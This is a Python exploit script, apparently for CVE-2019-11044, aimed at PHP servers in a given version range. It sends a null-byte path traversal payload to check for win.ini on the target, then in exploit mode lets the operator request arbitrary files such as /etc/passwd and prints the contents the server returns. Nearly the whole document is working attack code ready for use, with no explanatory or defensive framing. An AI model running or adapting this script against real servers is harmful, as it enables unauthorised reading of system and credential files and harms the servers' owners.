# Directory Traversal

# ^7\.2\.(?:[0-9]|1[0-9]|2[0-5])$|^7\.3\.(?:[0-9]|1[0-2])$|^7\.4\.0$

import requests
import sys
import subprocess
import argparse
import time
import socket 
import select  
import threading  
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse



def vulnerable_check(url):
    test_payload = "/../../../../../../../../../../../windows/win.ini\x00"
    
    try:
        new_path = test_payload + url.path
        new_url = urlunparse((
            url.scheme,   
            url.netloc,  
            new_path,           
            url.params,   
            url.query,    
            url.fragment  
        ))
        
        try:
            response = requests.get(new_url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error occurred in sending vulnerable check payload {e}")
            return False
        
    except Exception as e:
        print(f"[!] Error occurred in creating url with test payload: {e}")
        sys.exit(1)     
    
    if ("for 16-bit app support" in response.text) and response.status_code == 200:
        print("[+] Detected Vulnerability : True\n")
        return True
    else:
        print("[-] Detected Vulnerability : False\n")
        return False
    


parser = argparse.ArgumentParser(usage="""CVE-2019-11044.py -u https://*.*.*.*/index.php -m""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--mode', '-m', help='Exploit mode', action='store_true')
args = parser.parse_args()

parsed_url = urlparse(args.URL) 
path = parsed_url.path  

try:
    result = vulnerable_check(parsed_url)


    if result and args.mode:
        while True:
            print("-" * 150)
            user_input = input("[*] Put directory you want ex) /etc/passwd (or type 'exit' to quit): ").strip()
            if user_input.lower() == "exit":
                break

            # Validate user input
            if not user_input.startswith("/"):
                print("[!] Invalid input. Please start with '/'.")
                continue

            payload = "/../../../../../../../.." + user_input + "\x00"
            
            try:
                new_path = payload + parsed_url.path
                new_url = urlunparse((
                    parsed_url.scheme,   
                    parsed_url.netloc,  
                    new_path,           
                    parsed_url.params,   
                    parsed_url.query,    
                    parsed_url.fragment  
                ))
                
                try:
                    response = requests.get(new_url, timeout=10)
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error occured in sending user's payload: {e}")
                    
                
                print(response.text)
                
            except Exception as e:
                print(f"[!] Error occurred in creating url with user's payload: {e}")
                continue
  
except Exception as e:
    print(f"[!] Unexpected error: {e}")
    sys.exit(1)